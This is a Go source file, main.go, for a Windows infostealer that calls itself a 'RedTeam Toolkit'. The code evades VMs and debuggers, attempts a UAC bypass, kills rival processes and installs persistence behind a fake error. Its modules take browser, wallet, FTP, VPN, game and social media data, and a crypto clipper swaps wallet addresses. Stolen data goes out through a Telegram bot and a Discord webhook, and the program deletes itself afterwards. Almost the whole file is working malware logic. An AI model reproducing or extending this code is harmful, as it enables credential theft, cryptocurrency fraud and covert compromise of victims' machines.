// ============================================================
// main.go - RedTeam Toolkit v4.0 (Windows) - SKIP STEALTH
// ============================================================
package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"time"

	"github.com/RU7HL355/redtm/internal/antidebug"
	"github.com/RU7HL355/redtm/internal/antivm"
	"github.com/RU7HL355/redtm/internal/antivirus"
	"github.com/RU7HL355/redtm/internal/core/browsers"
	"github.com/RU7HL355/redtm/internal/core/clipper"
	"github.com/RU7HL355/redtm/internal/core/commonfiles"
	"github.com/RU7HL355/redtm/internal/core/cryptowallets"
	"github.com/RU7HL355/redtm/internal/core/exfil"
	"github.com/RU7HL355/redtm/internal/core/ftps"
	"github.com/RU7HL355/redtm/internal/core/games"
	"github.com/RU7HL355/redtm/internal/core/socials"
	"github.com/RU7HL355/redtm/internal/core/system"
	"github.com/RU7HL355/redtm/internal/core/vpn"
	"github.com/RU7HL355/redtm/internal/fakerr"
	"github.com/RU7HL355/redtm/internal/uac"
	"github.com/RU7HL355/redtm/pkg/utils/common"
	"github.com/RU7HL355/redtm/pkg/utils/processkill"
	"github.com/RU7HL355/redtm/pkg/utils/startup"
)

// Config struct for configuration
type Config struct {
	BotToken     string            `json:"botToken"`
	ChatID       string            `json:"chatId"`
	Discord      string            `json:"discordWebhook,omitempty"`
	Cryptos      map[string]string `json:"cryptos"`
	Enabled      bool              `json:"enabled"`
	Debug        bool              `json:"debug"`
	SelfDestruct bool              `json:"selfDestruct"`
}

var config Config
var startTime time.Time
var debugLog *os.File

func main() {
	startTime = time.Now()
	
	// Create debug log file
	debugLog, _ = os.Create("debug.log")
	defer debugLog.Close()
	
	writeDebug("🚀 RedTeam Toolkit v4.0 (Windows) starting...")
	
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	log.Println("🚀 RedTeam Toolkit v4.0 (Windows) starting...")
	log.Println("========================================")
	
	// Load configuration
	writeDebug("Loading config...")
	if !loadConfig() {
		log.Println("⚠️ No config found, using defaults")
		config = getDefaultConfig()
	} else {
		log.Println("✅ Config loaded successfully")
	}
	writeDebug("Config loaded")

	// Initialize exfil module
	writeDebug("Initializing exfil module...")
	log.Println("📤 Initializing exfil module...")
	exfil.Init(config.BotToken, config.ChatID, config.Discord)
	writeDebug("Exfil module initialized")

	// Send startup messages
	writeDebug("Sending Telegram test message...")
	log.Println("📤 Sending Telegram test message...")
	if exfil.SendTelegram("✅ RedTeam Toolkit v4.0 (Windows) is running!") {
		log.Println("✅ Telegram test message sent successfully!")
		writeDebug("Telegram test message sent successfully")
	} else {
		log.Println("❌ Telegram test message failed!")
		writeDebug("Telegram test message failed")
	}

	writeDebug("Sending Discord test message...")
	log.Println("📤 Sending Discord test message...")
	if exfil.SendDiscord("✅ RedTeam Toolkit v4.0 (Windows) is running!") {
		log.Println("✅ Discord test message sent successfully!")
		writeDebug("Discord test message sent successfully")
	} else {
		log.Println("❌ Discord test message failed!")
		writeDebug("Discord test message failed")
	}

	// Send system info
	writeDebug("Sending system info...")
	sendSystemInfo()

	// ============================================================
	// DEBUG: Force send a test message after 5 seconds
	// ============================================================
	writeDebug("Waiting 5 seconds...")
	log.Println("⏳ Waiting 5 seconds for test message...")
	time.Sleep(5 * time.Second)
	writeDebug("Sending debug message after 5 seconds...")
	exfil.SendTelegram("🔍 DEBUG: Test message after 5 seconds")

	// ============================================================
	// CHECK IF ALREADY RUNNING
	// ============================================================
	writeDebug("Checking if already running...")
	if common.IsAlreadyRunning() {
		log.Println("⚠️ Already running, exiting...")
		writeDebug("Already running, exiting")
		return
	}
	writeDebug("Not already running")

	// ============================================================
	// ANTI-ANALYSIS CHECKS
	// ============================================================
	writeDebug("Running anti-analysis checks...")
	log.Println("🔍 Running anti-analysis checks...")

	if antivm.IsVM() {
		log.Println("⚠️ VM detected - exiting")
		writeDebug("VM detected - exiting")
		exfil.SendHeartbeat("⚠️ VM detected - exiting")
		return
	}
	writeDebug("VM check passed")

	if antidebug.IsDebugged() {
		log.Println("⚠️ Debugger detected - exiting")
		writeDebug("Debugger detected - exiting")
		exfil.SendHeartbeat("⚠️ Debugger detected - exiting")
		return
	}
	writeDebug("Debugger check passed")
	
	log.Println("✅ Anti-analysis checks passed")
	exfil.SendDebug("Anti-analysis passed")

	// ============================================================
	// PRIVILEGE ESCALATION
	// ============================================================
	writeDebug("Attempting UAC bypass...")
	log.Println("🔐 Attempting UAC bypass...")
	uac.Run()
	writeDebug("UAC bypass attempted")

	// ============================================================
	// KILL COMPETITOR PROCESSES
	// ============================================================
	writeDebug("Killing competitor processes...")
	log.Println("💀 Killing competitor processes...")
	processkill.Run()
	writeDebug("Process kill attempted")

	// ============================================================
	// STEALTH OPERATIONS - SKIPPED FOR DEBUGGING
	// ============================================================
	writeDebug("Skipping stealth operations for debugging...")
	log.Println("🕵️ Skipping stealth operations (debug mode)")
	writeDebug("Stealth skipped")
	exfil.SendDebug("Stealth skipped (debug mode)")

	// ============================================================
	// PERSISTENCE
	// ============================================================
	writeDebug("Checking persistence...")
	if !common.IsInStartupPath() {
		log.Println("💾 Installing persistence...")
		writeDebug("Installing persistence...")
		go fakerr.Show()
		go startup.Run()
	}
	writeDebug("Persistence check done")

	// ============================================================
	// ANTI-ANALYSIS BACKGROUND TASKS
	// ============================================================
	writeDebug("Starting anti-analysis background tasks...")
	log.Println("🔒 Starting anti-analysis background tasks...")
	go antidebug.Run()
	go antivirus.Run()
	writeDebug("Anti-analysis background tasks started")

	// ============================================================
	// START SURVEILLANCE MODULES
	// ============================================================
	writeDebug("Starting surveillance modules...")
	log.Println("📹 Starting surveillance modules...")
	exfil.SendDebug("Starting extraction modules")

	// Define all extraction actions
	actions := []struct {
		name string
		fn   func()
	}{
		{"System Info", system.Run},
		{"Browsers", browsers.Run},
		{"Common Files", commonfiles.Run},
		{"Crypto Wallets", cryptowallets.Run},
		{"Games", games.Run},
		{"FTP Clients", ftps.Run},
		{"VPN Clients", vpn.Run},
		{"Social Media", socials.Run},
	}

	// Run all actions in parallel
	writeDebug("Starting extraction modules...")
	log.Println("📂 Starting extraction modules...")
	for _, action := range actions {
		log.Printf("📂 Starting: %s", action.name)
		writeDebug("Started: " + action.name)
		go action.fn()
	}
	writeDebug("All extraction modules started")

	// ============================================================
	// START CLIPPER
	// ============================================================
	writeDebug("Starting crypto clipper...")
	log.Println("💰 Starting crypto clipper...")
	go clipper.Run(config.Cryptos)
	writeDebug("Clipper started")

	// ============================================================
	// WAIT FOR EXTRACTION
	// ============================================================
	writeDebug("Waiting 60 seconds for extraction...")
	log.Println("⏳ Waiting 60 seconds for extraction...")
	exfil.SendDebug("Extraction started, waiting 60 seconds...")

	// Progress updates every 10 seconds
	for i := 1; i <= 6; i++ {
		writeDebug(fmt.Sprintf("Sleeping 10 seconds (%d/6)", i))
		time.Sleep(10 * time.Second)
		elapsed := int(time.Since(startTime).Seconds())
		log.Printf("⏳ Progress: %d seconds elapsed", elapsed)
		writeDebug(fmt.Sprintf("Progress: %d seconds elapsed", elapsed))
		exfil.SendDebug(fmt.Sprintf("%d seconds elapsed", elapsed))
	}
	writeDebug("Wait complete")

	// ============================================================
	// EXFILTRATE DATA
	// ============================================================
	writeDebug("Starting exfiltration...")
	log.Println("📤 Starting exfiltration...")
	exfil.SendDebug("Starting exfiltration...")

	// Create test file to ensure something is sent
	writeDebug("Creating test file...")
	createTestFile()
	writeDebug("Test file created")

	// Collect and exfil all data
	writeDebug("Collecting and sending exfil data...")
	log.Println("📤 Collecting and sending exfil data...")
	exfil.SendHeartbeat("📤 Collecting and exfiltrating data...")
	exfil.CollectAndSend()
	writeDebug("CollectAndSend complete")

	// Send browser data specifically
	writeDebug("Sending browser data...")
	log.Println("📤 Sending browser data...")
	exfil.SendBrowserData()
	writeDebug("SendBrowserData complete")

	// Send wallet data
	writeDebug("Sending wallet data...")
	log.Println("📤 Sending wallet data...")
	exfil.SendWalletData()
	writeDebug("SendWalletData complete")

	// Send system info
	writeDebug("Sending system info...")
	log.Println("📤 Sending system info...")
	exfil.SendSystemInfo()
	writeDebug("SendSystemInfo complete")

	// ============================================================
	// FINAL MESSAGES
	// ============================================================
	writeDebug("All tasks complete - sending final debug")
	exfil.SendDebug("All tasks complete")

	// Cleanup
	if config.SelfDestruct {
		writeDebug("Self-destruct initiated...")
		log.Println("💀 Self-destruct initiated...")
		exfil.SendHeartbeat("💀 Self-destruct initiated")
		time.Sleep(2 * time.Second)
		selfDestruct()
		writeDebug("Self-destruct complete")
	}

	// Final heartbeat
	writeDebug("Sending final heartbeat")
	exfil.SendHeartbeat("✅ All tasks complete")
	
	// Print summary
	writeDebug("Printing summary")
	printSummary()

	log.Println("✅ All tasks complete!")
	writeDebug("All tasks complete!")

	// Wait for exit
	time.Sleep(5 * time.Second)
}

func writeDebug(msg string) {
	if debugLog != nil {
		timestamp := time.Now().Format("2006-01-02 15:04:05.000")
		debugLog.WriteString(fmt.Sprintf("[%s] %s\n", timestamp, msg))
		debugLog.Sync()
	}
}

func loadConfig() bool {
	data, err := ioutil.ReadFile("config.json")
	if err != nil {
		log.Printf("❌ Failed to read config.json: %v", err)
		return false
	}

	if err := json.Unmarshal(data, &config); err != nil {
		log.Printf("❌ Failed to parse config.json: %v", err)
		return false
	}

	return true
}

func getDefaultConfig() Config {
	return Config{
		BotToken: "",
		ChatID:   "",
		Discord:  "",
		Cryptos: map[string]string{
			"BTC":  "",
			"BCH":  "",
			"ETH":  "",
			"XMR":  "",
			"LTC":  "",
			"XCH":  "",
			"XLM":  "",
			"TRX":  "",
			"ADA":  "",
			"DASH": "",
			"DOGE": "",
		},
		Enabled:       true,
		Debug:         false,
		SelfDestruct:  false,
	}
}

func sendSystemInfo() {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	
	info := fmt.Sprintf("🖥️ System Information\n")
	info += fmt.Sprintf("   Hostname: %s\n", hostname)
	info += fmt.Sprintf("   Username: %s\n", username)
	info += fmt.Sprintf("   OS: %s\n", common.GetOS())
	info += fmt.Sprintf("   Admin: %v\n", common.IsAdmin())
	info += fmt.Sprintf("   Time: %s", time.Now().Format("2006-01-02 15:04:05"))
	
	exfil.SendHeartbeat(info)
}

func createTestFile() {
	testData := map[string]interface{}{
		"test":      "This is a test file from RedTeam Toolkit",
		"timestamp": time.Now().Format("2006-01-02 15:04:05"),
		"hostname":  getHostname(),
		"username":  getUsername(),
	}
	
	testJSON, err := json.MarshalIndent(testData, "", "  ")
	if err != nil {
		log.Printf("❌ Failed to create test JSON: %v", err)
		return
	}
	
	if err := ioutil.WriteFile("test.json", testJSON, 0644); err != nil {
		log.Printf("❌ Failed to write test.json: %v", err)
		return
	}
	
	log.Println("📁 Created test.json for debugging")
	exfil.SendDebug("📁 Created test.json")
}

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

func getUsername() string {
	if os.Getenv("USERNAME") != "" {
		return os.Getenv("USERNAME")
	}
	return os.Getenv("USER")
}

func printSummary() {
	elapsed := int(time.Since(startTime).Seconds())
	
	log.Println("========================================")
	log.Println("📊 SUMMARY")
	log.Println("========================================")
	log.Printf("   Duration: %d seconds", elapsed)
	log.Printf("   Config: %s", getConfigStatus())
	log.Printf("   Telegram: %s", getTelegramStatus())
	log.Printf("   Discord: %s", getDiscordStatus())
	log.Println("========================================")
}

func getConfigStatus() string {
	if config.BotToken != "" && config.ChatID != "" {
		return "✅ Configured"
	}
	return "❌ Not Configured"
}

func getTelegramStatus() string {
	if config.BotToken != "" {
		return "✅ Enabled"
	}
	return "❌ Disabled"
}

func getDiscordStatus() string {
	if config.Discord != "" {
		return "✅ Enabled"
	}
	return "❌ Disabled"
}

func selfDestruct() {
	log.Println("🧹 Cleaning up...")
	os.Remove("redteam.log")
	os.Remove("telemetry.log")
	os.Remove("debug.log")
	
	files := []string{
		"browser_data.json", "system_info.json", "wallets.json",
		"games.json", "socials.json", "common_files.json",
		"ftps.json", "vpns.json", "test.json",
	}
	for _, file := range files {
		os.Remove(file)
	}
	
	if common.IsWindows() {
		cmd := "timeout /t 2 /nobreak > nul & del " + os.Args[0]
		os.StartProcess("cmd", []string{"/c", cmd}, nil)
	}
}